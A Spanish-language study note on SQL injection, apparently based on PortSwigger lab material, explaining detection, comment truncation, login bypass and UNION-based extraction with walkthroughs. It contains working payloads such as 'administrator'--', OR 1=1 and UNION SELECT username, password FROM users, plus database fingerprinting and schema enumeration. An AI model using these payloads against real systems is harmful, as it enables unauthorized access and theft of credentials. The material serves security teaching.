# Teoría

>[!Note]
>***Definición***
>La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos.

## Impacto

Un ataque de inyección SQL puede resultar en acceso no autorizado a datos confidenciales, tales como:

- **Contraseñas**
- **Datos de la tarjeta de crédito**
- **Información personal del usuario**

En algunos casos, un atacante puede obtener una puerta trasera persistente en los sistemas de una organización, lo que lleva a un compromiso a largo plazo que puede pasar desapercibido durante un período prolongado.
## Detección

Podemos detectar la inyección SQL manualmente usando un conjunto sistemático de pruebas contra cada punto de entrada de la aplicación.

>[!important]
>Para hacer esto, normalmente enviaríamos:
>- Una comilla simple `'`  y buscaríamos errores u otras anomalías.
>- Alguna sintaxis específica de SQL que evalúa el valor base (original) del punto de entrada y un valor diferente, y busca diferencias sistemáticas en las respuestas de la aplicación.
>- Condiciones booleanas como `OR 1=1` y `OR 1=2`, y busque diferencias en las respuestas de la aplicación.
>- Cargas útiles diseñadas para provocar retrasos cuando se ejecutan dentro de una consulta SQL y buscar diferencias en el tiempo necesario para responder.
>- Cargas útiles OAST diseñadas para activar una interacción de red fuera de banda cuando se ejecutan dentro de una consulta SQL y monitorear cualquier interacción resultante.

## SQLi en diferentes partes de la consulta

La mayoría de las vulnerabilidades SQLi ocurren dentro de la cláusula `WHERE` de una consulta `SELECT`.

Sin embargo, pueden ocurrir vulnerabilidades SQLi en cualquier ubicación dentro de la consulta y dentro de diferentes tipos de consultas. 

>[!warning]
>Otras ubicaciones comunes donde surgen SQLi
>- En declaraciones `UPDATE`, dentro de los valores actualizados o la clausula `WHERE`.
>- En declaraciones `INSERT`, dentro de los valores insertados.
>- En declaraciones `SELECT`, dentro del nombre de la tabla o columna.
>- En declaraciones `SELECT`, dentro de la clausula `ORDER BY`.

---
---
## Ejemplos de SQLi
#### Recuperación de datos ocultos

Imaginemos una aplicación de compras que muestre productos en diferentes categorías. Cuando el usuario hace clic en la categoría **Gifts**, su navegador solicita la URL:
 \text{https://insecure-website.com/products?category=Gifts} 
Esto hace que la aplicación realice una consulta SQL para recuperar detalles de los productos relevantes de la base de datos:

```SQL
SELECT * FROM products WHERE category = 'Gifts' AND  released = 1
```

>[!Note]
>Esta consulta SQL solicita a la base de datos que devuelva<font color=red>:</font>
>- Todos los detalles (`*`)
>- Desde la tabla `products`
>- Donde el valor de la columna `category` es `Gifts`
>- Y el valor de la columna `released` es `1`

>[!important]
>La restricción `released = 1` se usa para ocultar productos que no se lanzan al mercado.

>[!warning]
>Podríamos suponer que para los productos inéditos se usa `released = 0`.

La aplicación no usa defensas contra SQLi, por lo que un atacante podría construir el siguiente ataque:
 \text{https://insecure-website.com/products?category=Gifts'--} 
Lo que da como resultado la consulta SQL:
```SQL
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

>[!warning]
>`--` es un indicador de comentarios en SQL.
>Lo que significa que el resto de la consulta SQL tras estos `--` se interpreta como un comentario.

En este ejemplo, usando `--` se consigue que la consulta SQL ya no incluya `AND released = 1`. Como resultado se muestran todos los productos, incluidos aquellos que aún no se han lanzado.

Si tan solo quisiéramos que se nos devolviera los productos que aún no se han lanzado podríamos usar:
 https://insecure-website.com/products?category=Gifts'+AND+released=0-- 
Esto resultaría en la siguiente consulta SQL:
```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 0--' AND released = 1
```

Esto tan solo mostraría los productos de la categoría `Gifts` que no se hayan lanzado aún.

---
Podemos usar un ataque similar para hacer que la aplicación muestre todos los productos en cualquier categoría, incluidas categorías que no conocemos:
 https://insecure-website.com/products?category=Gifts'+OR+1=1--
Esto da como resultado la consulta SQL:
```SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

La consulta modificada devuelve todos los elementos donde: `category` es `Gifts`, o `1` es igual a `1`. Como `1=1` siempre es cierto, la consulta devuelve todos los elementos.

>[!tip]
>Aclaración
>La lectura de la consulta es la siguiente:
>- Muéstrame todos los elementos cuya categoría es `Gifts`
>- O que `1=1`

>[!example]- Ejemplo
>
| id  | name     | category   | stock | released |
| --- | -------- | ---------- | ----- | -------- |
| 1   | mantel   | Cocina     | 234   | 1        |
| 2   | pancarta | Gifts      | 24    | 1        |
| 3   | carpeta  | Gifts      | 543   | 0        |
| 4   | Vela     | Decoración | 321   | 1        |
>
>Empezando por la primera fila:
>1. El valor de la columna `category` es `Gifts`? --> NO
>2. Es `1=1`? --> Sí
>3. Se muestra
>   
>Segunda fila:
>1. El valor de la columna `category` es `Gifts`? --> SÍ
>2. Se muestra

>[!warning]
>Tenga cuidado al inyectar la condición `OR 1=1` en una consulta SQL. Incluso si parece inofensivo en el contexto en el que estámos inyectando, es común que las aplicaciones utilicen datos de una sola solicitud en múltiples consultas diferentes. Si su condición alcanza una declaración `UPDATE` o `DELETE` , por ejemplo, puede provocar una pérdida accidental de datos.

##### Práctica | Lab: SQLi in WHERE clause allowing retrieval of hidden data

_This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:_

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

_To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products._

Para solucionar el laboratorio manipulamos la URL, como sabemos que la vulnerabilidad SQLi se encuentra en el filtro de `category`, usamos:
https://insecure-website.com/filter?category=Gifts'--
Sin embargo, nos devuelve varios resultados, pero no se resuelve el laboratorio. Para depurar, hacemos el siguiente ataque para mostrar solo los productos de la categoría `Gifts` que no se han lanzado aún:
 https://insecure-website.com/filter?category=Gifts'+AND+released=0--
Ahora tan solo nos devuelve 1 resultado. Es decir, tan solo existe un elemento en la tabla `products` cuyo valor de la columna `category` sea `Gifts` y que además el valor de la columna `released` sea `0`.

El enunciado nos indica que debemos de mostrar uno o más elementos cuyo valor de `released` sea `0`, pero con uno no se ha resuelto el laboratorio, vamos a mostrar todos los productos de todas las categorías que aún no se han lanzado al mercado:
 https://insecure-website.com/filter?category=Gifts'+OR+1=1+AND+released=0--
```SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 AND released = 0--' AND released = 1
```

Esta consulta tan solo nos mostrará los productos de cualquier categoría que aún no se han lanzado al mercado.

---
---
#### Subvertir la lógica de la aplicación

Imaginemos una aplicación que permita a los usuarios iniciar sesión con usuario y contraseña. Si un usuario envía el nombre de usuario `wiener` y la contraseña `bluecheese`, la aplicación verifica las credenciales realizando la siguiente consulta SQL:

```SQL
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Si la consulta devuelve los datos de un usuario, el inicio de sesión será exitoso. En caso contrario, se rechaza.

En este caso, un atacante puede iniciar sesión como cualquier sin necesidad de contraseña. Pueden hacer esto usando la secuencia de comentarios SQL `--` para eliminar la verificación de contraseña de la clausula `WHERE` de la consulta. Por ejemplo, enviar el nombre de usuario `administrator'--` y una contraseña en blanco da como resultado la siguiente consulta:

```SQL
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Esta consulta devuelve el usuario cuyo `username` es `administrator` y registra exitosamente el atacante como ese usuario.

##### Práctica | Lab: Vulnerabilidad de Inyección SQL que permite omitir el inicio de sesión

*This lab contains a SQL injection vulnerability in the login function.*

*To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.*


***En un panel de loggin:***

| username         | password |
| :---: | :---: |
| administartor'-- | test     |
Consulta SQL:
```SQL
SELECT * FROM user WHERE username = 'administrator'--' AND password = 'test'
```

#### Recuperación de datos de otras tablas de bases de datos

En los casos en los que una aplicación responde con los resultados de una consulta SQL, un atacante puede utilizar una vulnerabilidad de inyección SQL para recuperar datos de otras tablas dentro de la base de datos. Podemos utilizar la palabra clave `UNION` para ejecutar una consulta `SELECT` adicional y agregar los resultados a la consulta original.

Por ejemplo, si una aplicación ejecuta la siguiente consulta que contiene la entrada del usuario `Gifts`:

```SQL
SELECT name, description FROM products WHERE category = 'Gifts'
```

Un atacante puede enviar la entrada:

```SQL
' UNINON SELECT username, password FROM users--
```

Esto hace que la aplicación devuelva todos los nombres de usuario y contraseñas junto con los nombres y descripciones de los productos.

>[!bug]
>Consulta SQL maliciosa
>```SQL
>SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'
>```

#### Ataques UNION de SQLi

Cuando una aplicación es vulnerable a la inyección SQL y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación, puede utilizar la palabra clave `UNION` para recuperar datos de otras tablas dentro de la base de datos. Esto se conoce comúnmente como ataque `UNION` de inyección SQL.

La palabra clave `UNION` nos permite ejecutar uno o más consultas `SELECT` consultas y agregar los resultados a la consulta original.

>[!example]
>Ejemplo
>```SQL
>SELECT a, b, FROM table1 UNION SELECT c, d FROM table2
>```

Esta consulta devuelve un único conjunto de resultados con dos columnas, que contienen valores de las columnas `a` y `b` en `table1` y columnas `c` y `d` en `table2`.

>[!important]
>Para que una consulta `UNION` funcione, se deben cumplir dos requisitos clave:
>- Las consultas individuales deben devolver la misma cantidad de columnas.
>- Los tipos de datos de cada columna deben ser compatibles entre las columnas individuales.

Para llevar a cabo un ataque `UNION` de SQLi, debemos asegurarnos de que nuestro ataque cumpla con estos dos requisitos.
Normalmente esto implica descubrir:

- Cuántas columnas se devuelven de la consulta original?
- Qué columnas devueltas de la consulta original son de un tipo de datos adecuado para contener los resultados de la consulta inyectada?

##### Determinar el número de columnas necesarias

Existen dos métodos efectivos para determinar cuántas columnas se devuelven de la consulta original.

- Un método implica en inyectar una serie de clausulas `ORDER BY` e incrementar el índice de columna especificado hasta que se produzca un error. Por ejemplo, si el punto de inyección es una cadena entre comillas dentro de la clausula `WHERE`, nosotros enviaríamos:
  `' ORDER BY 1--`
  `' ORDER BY 2--`
  `' ORDER BY 3--`
  etc.
  
  Esta serie de *payloads* modifica la consulta original para ordenar los resultados por diferentes columnas en el conjunto de resultados.
  
  La columna en una clausula `ORDER BY` se puede especificar por su índice, por lo que no es necesario conocer el nombre de ninguna columna.
  Cuando el índice de columna especificado excede la cantidad de columnas reales en el conjunto de resultados, la base de datos devuelve un error, como:
   \text{The ORDER BY position number 3 is out of range of the number of items in the select list.} 
  
  La aplicación puede devolver el error de la base de datos en su respuesta *HTTP*, pero también podría devolver una respuesta de error genérica. En otros casos, es posible que simplemente no arroje ningún resultado. Siempre que podamos detectar alguna diferencia en la respuesta, podemos inferir cuántas columnas se devuelven de la consulta.
  
  >[!example]
  >Ejemplo
  > https://insecure-website.com/filter?category=Gifts'+ORDER+BY+4-- 
  ><font color=red>Internal Server Error</font>
<br>
- El segundo método implica enviar una serie de *payloads* `UNION SELECT` que especifican un número diferentes de valores nulos:
  `' UNION SELECT NULL--`
  `' UNION SELECT NULL,NULL--`
  `' UNION SELECT NULL,NULL,NULL--`
  etc.
  
  Si el número de valores nulos no coincide con el número de columnas, la base de datos devuelve un error, como por ejemplo:
   \text{All queries combined using a UNION, INTERSECT or EXCEPT operator mush have an equal number of expressions in their target lists.} 
  
  >Usamos `NULL` como los valores devueltos por la consulta `SELECT` inyectada porque los tipos de datos en cada columna deber ser compatibles entre las consultas originales y las inyectadas. `NULL` es convertible a todos los tipos de datos comunes, por lo que se maximiza la posibilidad de que la carga útil tenga éxito cuando el recuento de columnas sea correcto.
  
  Cuando el número de valores nulos coincide con el número de columnas, la base de datos devuelve una fila adicional en el conjunto de resultados, que contiene valores nulos en cada columna.
  El efecto sobre la respuesta HTTP depende del código de la aplicación. Si tienes suerte, verás contenido adicional dentro de la respuesta, como una fila adicional en una tabla HTML. De lo contrario, los valores nulos podrían desencadenar un error diferente, como a `NullPointerException`. En el peor de los casos, la respuesta podría parecer la misma que una respuesta causada por un número incorrecto de valores nulos. Esto haría que este método fuera ineficaz.
  
  >[!example]
  >Ejemplo práctico
  > \text{https://insecure-website.com/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--} 
  ><font color=gren>Respuesta correcta</font>
  
##### Sintaxis específica de la base de datos

En _**<font color=cyan>Oracle</font>**_, cada consulta `SELECT` debe utilizar la palabra clave `FROM` y especificar una tabla válida. 

>[!tip]
>Hay una tabla incorporada en _**<font color=cyan>Oracle</font>**_ llamada `dual` que puede utilizarse para este fin.

>[!warning]
>Las consultas inyectadas en _**<font color=cyan>Oracle</font>**_ tienen que verse así<font color=red>:</font>
>```SQL
>' UNION SELECT NULL FROM DUAL--
>```

Los *payloads* descritos utilizan la secuencia de comentarios de doble guión `--` para comentar el resto de la consulta original después del punto de inyección. En _**<font color=cyan>MySQL</font>**_, la secuencia de doble guión debe ir seguida de un espacio `-- `. Alternativamente, el carácter _**hash**_ `#` se puede utilizar para identificar un comentario.

>[!tip]
>***Cheat sheet*** 
>Aquí podemos ver la ***[[SQLi cheat sheet|cheat sheet]]*** de cada Sistema Gestor de Bases de Datos.

##### Encontrar columnas con un tipo de datos útil

Un ataque `UNION` de SQLi nos permite recuperar resultados de un consulta inyectada. 

>[!important]
>Los datos interesantes que desea recuperar normalmente están en forma de `string`. 
>Esto significa que debemos encontrar una o más columnas en los resultados de la consulta original cuyo tipo de datos sea, o sea compatible con, datos `strings`.

Después de determinar el número de columnas requeridas, podemos sondear cada columna para probar si puede contener datos `string`. Podemos enviar una serie de *payloads* `UNION SELECT` que colocan un valor de cadena en cada columna por turno.

>[!example]
>Si una consulta devuelve cuatro columnas<font color=red>:</font>
>`UNION SELECT 'a',NULL,NULL,NULL--`
>`UNION SELECT NULL,'a',NULL,NULL--` 
>`UNION SELECT NULL,NULL,'a',NULL--`
>`UNION SELECT NULL,NULL,NULL,'a'--`

Si el tipo de datos de la columna no es compatible con los datos `string`, la consulta inyectada provocará un error en la base de datos, como por ejemplo:
 \text{Conversion failed when converting the varchar value 'a' to data type int.} 

Si no se produce un error y la respuesta de la aplicación contiene algún contenido adicional, incluido el valor de `string` inyectado, entonces la columna correspondiente es adecuada para recuperar datos `string`.

###### Práctica | Lab: SQL injection UNION atack, finding a column containing text

*This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.*

*The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.*

>[!tip]
>1.Detectamos cuantas columnas devuelve la consulta original:
> \text{https://insecure-website.com/filter?category=Gifts'+ORDER+BY+1--} 
> \text{https://insecure-website.com/filter?category=Gifts'+ORDER+BY+2--} 
> \text{https://insecure-website.com/filter?category=Gifts'+ORDER+BY+3--} 
> \text{https://insecure-website.com/filter?category=Gifts'+ORDER+BY+4--} 
>
>Tras el 4 intento nos muestra un error, lo que quiere decir que la consulta original devuelve 3 columnas.
>
>---
>
> \text{https://insecure-website.com/filter?category=Gifts'+UNION+SELECT+NULL--} 
> \text{https://insecure-website.com/filter?category=Gifts'+UNION+SELECT+NULL,NULL--} 
> \text{https://insecure-website.com/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--} 
>
>Tras el tercer intento nos muestra la salida normal, esto significa que la consulta original devuelve tres columnas.

>[!tip]
>2.Detectamos la columna compatible con datos de tipo `string`:
> \text{https://insecure-website.com/filter?category=Gifts'+UNION SELECT 'a',NULL,NULL--} 
> \text{https://insecure-website.com/filter?category=Gifts'+UNION SELECT NULL,'a',NULL--} 
> \text{https://insecure-website.com/filter?category=Gifts'+UNION SELECT NULL,NULL,'a'--} 
>
>El segundo intento (`NULL,'a',NULL`) nos ha devuelto la salida correcta + el `string "a"` en la columna. Lo que quiere decir que el tipo de dato de la segunda columna especificada en la consulta original es compatible con tipos de datos `string`.

>[!tip]
>3.Mostrar el código especificado:
>En este caso el código es `eDf78K`:
> \text{https://insecure-website.com/filter?category=Gifts'+UNION+SELECT+NULL,'Edf78K',NULL--} 
>Esto generará la siguiente consulta SQL en la base de datos:
>```SQL
>SELECT price, description, details FROM products where category = 'Gifts' UNION SELECT NULL,'eDF78K',NULL--' AND released = 1
>```

---
---
También podemos sacar más información, como la versión de la base de datos. Para ello deberemos de conocer que Sistema Gestor de Bases de Datos se esta usando:

Ya sabemos que no puede ser ***Oracle*** ya que estas consultas anteriores las hemos realizado sin especificar la tabla.

>[!tip]
>Averiguar el Sistema Gestor de Bases de Datos:
>Probamos para ***Microsoft*** y ***MySQL*** ya que usan la misma sintaxis.
> \text{https://insecure-website.com/filter?category=Gifts' UNION SELECT NULL,@@version,NULL--} 
>Nos muestra un error, por lo que podemos sobreentender que no son los correctos.
>
>Probamos ***PostgreSQL***.
> \text{https://insecure-website.com/filter?category=Gifts' UNION SELECT NULL,version(),NULL--} 
>`> PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit`

>[!tip]
>Ahora vamos a conocer también el nombre de las tablas:
>```
>https://insecure-website.com/filter?category=Gifts' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
>```

##### Uso de ataque UNION de SQLi para recuperar datos interesantes

Una vez determinado el número de columnas devueltas por la consulta original y hayamos encontrado qué columnas pueden contener datos de tipo `string`, estaremos en condiciones de recuperar datos interesantes.

Supongamos que:

- La consulta original devuelve 2 columnas, ambas pueden contener datos de tipo `string`.
- El punto de inyección es un `string` entre comillas dentro de la clausula `WHERE`.
- La base de datos contiene una tabla llamada `users` con las columnas `username` y `password`.

En este ejemplo podemos recuperar el contenido de la tabla `users` enviando la entrada:
```sql
' UNION SELECT username, password FROM users--
```

Para realizar este ataque es necesario conocer que existe una tabla `users` con dos columnas llamadas `usernames` y `password`. Sin esta información, tendríamos que adivinar los nombres de las tablas y columnas. Todas las bases de datos modernas proporcionan formas de examinar la estructura de la base de datos y determinar qué tablas y columnas contienen.

>[!tip]
>Read more
>- [[Examinando la base de datos en ataques de inyección SQL]]

##### Recuperar múltiples valores dentro de una sola columna

En algunos casos, es posible que la consulta original tan solo devuelva una única columna.

Podemos recuperar varios valores juntos dentro de esta única columna concatenando los valores. Podemos incluir un *separator* que nos permita distinguir los valores combinados. Por ejemplo, en ***Oracle*** podríamos enviar la entrada:
```
'UNION SELECT username || '~' || password FROM users--

...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

Utilizamos la secuencia `||` que es un operador de concatenación de `strings` en ***Oracle***. La consulta inyectada concatena los valores de los campos `username` y `password`, separados por el carácter `~`.

